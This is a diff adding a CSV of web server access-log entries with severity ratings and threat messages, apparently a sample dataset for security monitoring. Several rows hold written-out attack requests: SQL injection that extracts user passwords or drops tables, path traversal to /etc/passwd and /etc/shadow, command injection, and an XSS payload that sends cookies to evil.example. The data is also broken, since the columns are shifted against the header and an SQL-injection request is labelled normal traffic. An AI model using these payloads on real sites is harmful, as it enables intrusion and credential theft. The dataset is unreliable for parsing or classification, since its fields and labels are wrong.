@@ -1,0 +1,63 @@
+Client IP,Timestamp,Requested URL,Status Code,Severity,Threat Message
+192.168.1.45,404,"[18/Oct/2026:14:32:10,+0000]","""GET,/admin/login.php,HTTP/1.1""",Critical,Malicious IP pattern detected in URL
+192.168.1.10,200,"[18/Oct/2026:14:32:15,+0000]","""GET,/index.html,HTTP/1.1""",INFO,Normal Traffic
+192.168.1.10,200,"[18/Oct/2026:14:32:16,+0000]","""GET,/assets/css/style.css,HTTP/1.1""",INFO,Normal Traffic
+192.168.1.10,200,"[18/Oct/2026:14:32:16,+0000]","""GET,/assets/js/main.js,HTTP/1.1""",INFO,Normal Traffic
+39.42.88.112,301,"[18/Oct/2026:14:35:02,+0000]","""GET,/,HTTP/1.1""",INFO,Normal Traffic
+39.42.88.112,200,"[18/Oct/2026:14:35:03,+0000]","""GET,/home.php,HTTP/1.1""",INFO,Normal Traffic
+39.42.88.112,200,"[18/Oct/2026:14:35:29,+0000]","""GET,/about.html,HTTP/1.1""",INFO,Normal Traffic
+192.168.1.45,404,"[18/Oct/2026:14:40:01,+0000]","""GET,/wp-admin/setup-config.php,HTTP/1.1""",Critical,Malicious IP pattern detected in URL
+192.168.1.45,404,"[18/Oct/2026:14:40:02,+0000]","""GET,/phpmyadmin/index.php,HTTP/1.1""",Critical,Malicious IP pattern detected in URL
+192.168.1.45,403,"[18/Oct/2026:14:40:03,+0000]","""GET,/.env,HTTP/1.1""",Critical,Malicious IP pattern detected in URL
+192.168.1.45,403,"[18/Oct/2026:14:40:04,+0000]","""GET,/.git/config,HTTP/1.1""",Critical,Malicious IP pattern detected in URL
+192.168.1.45,404,"[18/Oct/2026:14:40:05,+0000]","""GET,/backup.zip,HTTP/1.1""",Warning,Suspicious Activity (404)
+192.168.1.45,404,"[18/Oct/2026:14:40:06,+0000]","""GET,/config.php.bak,HTTP/1.1""",Critical,Malicious IP pattern detected in URL
+192.168.1.45,403,"[18/Oct/2026:14:40:07,+0000]","""GET,/server-status,HTTP/1.1""",Critical,Malicious IP pattern detected in URL
+192.168.1.45,404,"[18/Oct/2026:14:40:08,+0000]","""GET,/uploads/shell.php,HTTP/1.1""",Warning,Suspicious Activity (404)
+10.0.0.15,200,"[18/Oct/2026:15:10:12,+0000]","""GET,/login.php,HTTP/1.1""",INFO,Normal Traffic
+10.0.0.15,302,"[18/Oct/2026:15:10:25,+0000]","""POST,/login.php,HTTP/1.1""",INFO,Normal Traffic
+10.0.0.15,200,"[18/Oct/2026:15:10:26,+0000]","""GET,/dashboard/overview.php,HTTP/1.1""",INFO,Normal Traffic
+10.0.0.15,200,"[18/Oct/2026:15:11:04,+0000]","""GET,/api/notifications,HTTP/1.1""",INFO,Normal Traffic
+185.220.101.42,401,"[19/Oct/2026:03:12:01,+0000]","""POST,/admin/login.php,HTTP/1.1""",Critical,Malicious IP pattern detected in URL
+185.220.101.42,401,"[19/Oct/2026:03:12:01,+0000]","""POST,/admin/login.php,HTTP/1.1""",Critical,Malicious IP pattern detected in URL
+185.220.101.42,401,"[19/Oct/2026:03:12:01,+0000]","""POST,/admin/login.php,HTTP/1.1""",Critical,Malicious IP pattern detected in URL
+185.220.101.42,401,"[19/Oct/2026:03:12:02,+0000]","""POST,/admin/login.php,HTTP/1.1""",Critical,Malicious IP pattern detected in URL
+185.220.101.42,401,"[19/Oct/2026:03:12:02,+0000]","""POST,/admin/login.php,HTTP/1.1""",Critical,Malicious IP pattern detected in URL
+185.220.101.42,401,"[19/Oct/2026:03:12:02,+0000]","""POST,/admin/login.php,HTTP/1.1""",Critical,Malicious IP pattern detected in URL
+185.220.101.42,401,"[19/Oct/2026:03:12:03,+0000]","""POST,/admin/login.php,HTTP/1.1""",Critical,Malicious IP pattern detected in URL
+185.220.101.42,401,"[19/Oct/2026:03:12:03,+0000]","""POST,/admin/login.php,HTTP/1.1""",Critical,Malicious IP pattern detected in URL
+185.220.101.42,401,"[19/Oct/2026:03:12:04,+0000]","""POST,/admin/login.php,HTTP/1.1""",Critical,Malicious IP pattern detected in URL
+185.220.101.42,401,"[19/Oct/2026:03:12:04,+0000]","""POST,/admin/login.php,HTTP/1.1""",Critical,Malicious IP pattern detected in URL
+185.220.101.42,403,"[19/Oct/2026:03:12:05,+0000]","""POST,/admin/login.php,HTTP/1.1""",Critical,Malicious IP pattern detected in URL
+192.168.1.22,200,"[19/Oct/2026:09:20:11,+0000]","""GET,/products.php?category=security,HTTP/1.1""",INFO,Normal Traffic
+192.168.1.22,200,"[19/Oct/2026:09:20:45,+0000]","""GET,/products.php?id=12,HTTP/1.1""",INFO,Normal Traffic
+192.168.1.22,200,"[19/Oct/2026:09:21:18,+0000]","""POST,/cart/add.php,HTTP/1.1""",INFO,Normal Traffic
+45.155.205.233,500,"[19/Oct/2026:11:05:10,+0000]","""GET,/products.php?id=1',HTTP/1.1""",High,Server Error - Possible Exploit Attempt
+45.155.205.233,200,"[19/Oct/2026:11:05:12,+0000]","""GET,/products.php?id=1'%20OR%20'1'='1,HTTP/1.1""",INFO,Normal Traffic
+45.155.205.233,500,"[19/Oct/2026:11:05:14,+0000]","""GET,/products.php?id=1%20UNION%20SELECT%201,username,password%20FROM%20users--,HTTP/1.1""",Critical,Malicious IP pattern detected in URL
+45.155.205.233,403,"[19/Oct/2026:11:05:16,+0000]","""GET,/products.php?id=-1%20UNION%20SELECT%20table_name,column_name,1%20FROM%20information_schema.columns--,HTTP/1.1""",Critical,Malicious IP pattern detected in URL
+45.155.205.233,500,"[19/Oct/2026:11:05:19,+0000]","""GET,/orders.php?id=10;DROP%20TABLE%20users--,HTTP/1.1""",Critical,Malicious IP pattern detected in URL
+91.240.118.172,403,"[19/Oct/2026:14:22:09,+0000]","""GET,/download.php?file=../../../../etc/passwd,HTTP/1.1""",Critical,Malicious IP pattern detected in URL
+91.240.118.172,403,"[19/Oct/2026:14:22:11,+0000]","""GET,/view.php?page=../../../../../etc/shadow,HTTP/1.1""",Critical,Malicious IP pattern detected in URL
+91.240.118.172,500,"[19/Oct/2026:14:22:14,+0000]","""GET,/cgi-bin/test.cgi?cmd=/bin/cat%20/etc/passwd,HTTP/1.1""",Critical,Malicious IP pattern detected in URL
+91.240.118.172,401,"[19/Oct/2026:14:22:18,+0000]","""DELETE,/api/users/1,HTTP/1.1""",Warning,Suspicious Activity (401)
+203.0.113.45,200,"[19/Oct/2026:16:45:30,+0000]","""GET,/blog/cybersecurity-tips.html,HTTP/1.1""",INFO,Normal Traffic
+203.0.113.45,200,"[19/Oct/2026:16:46:12,+0000]","""GET,/contact.html,HTTP/1.1""",INFO,Normal Traffic
+203.0.113.45,200,"[19/Oct/2026:16:47:05,+0000]","""POST,/contact/submit.php,HTTP/1.1""",INFO,Normal Traffic
+103.251.167.20,403,"[20/Oct/2026:08:15:40,+0000]","""GET,/search.php?q=<script>alert('XSS')</script>,HTTP/1.1""",Critical,Malicious IP pattern detected in URL
+103.251.167.20,403,"[20/Oct/2026:08:15:44,+0000]","""GET,/feedback.php?comment=<script>document.location='http://evil.example/grab?c='+document.cookie</script>,HTTP/1.1""",Critical,Malicious IP pattern detected in URL
+103.251.167.20,403,"[20/Oct/2026:08:15:50,+0000]","""PUT,/api/profile/avatar.php,HTTP/1.1""",Warning,Suspicious Activity (403)
+45.33.32.156,301,"[20/Oct/2026:10:02:01,+0000]","""GET,/admin,HTTP/1.1""",Critical,Malicious IP pattern detected in URL
+45.33.32.156,404,"[20/Oct/2026:10:02:01,+0000]","""GET,/admin/panel.php,HTTP/1.1""",Critical,Malicious IP pattern detected in URL
+45.33.32.156,403,"[20/Oct/2026:10:02:02,+0000]","""GET,/admin/users.php,HTTP/1.1""",Critical,Malicious IP pattern detected in URL
+45.33.32.156,404,"[20/Oct/2026:10:02:02,+0000]","""GET,/admin/db_backup.sql,HTTP/1.1""",Critical,Malicious IP pattern detected in URL
+45.33.32.156,404,"[20/Oct/2026:10:02:03,+0000]","""GET,/wp-login.php,HTTP/1.1""",Warning,Suspicious Activity (404)
+185.199.108.50,200,"[20/Oct/2026:11:30:10,+0000]","""GET,/,HTTP/1.1""",INFO,Normal Traffic
+185.199.108.50,200,"[20/Oct/2026:11:30:10,+0000]","""GET,/,HTTP/1.1""",INFO,Normal Traffic
+185.199.108.50,200,"[20/Oct/2026:11:30:10,+0000]","""GET,/,HTTP/1.1""",INFO,Normal Traffic
+185.199.108.50,200,"[20/Oct/2026:11:30:10,+0000]","""GET,/,HTTP/1.1""",INFO,Normal Traffic
+185.199.108.50,200,"[20/Oct/2026:11:30:10,+0000]","""GET,/,HTTP/1.1""",INFO,Normal Traffic
+185.199.108.50,200,"[20/Oct/2026:11:30:10,+0000]","""GET,/,HTTP/1.1""",INFO,Normal Traffic
+185.199.108.50,500,"[20/Oct/2026:11:30:10,+0000]","""GET,/,HTTP/1.1""",High,Server Error - Possible Exploit Attempt
+185.199.108.50,500,"[20/Oct/2026:11:30:10,+0000]","""GET,/,HTTP/1.1""",High,Server Error - Possible Exploit Attempt
+192.168.1.10,302,"[20/Oct/2026:12:05:44,+0000]","""GET,/logout.php,HTTP/1.1""",INFO,Normal Traffic
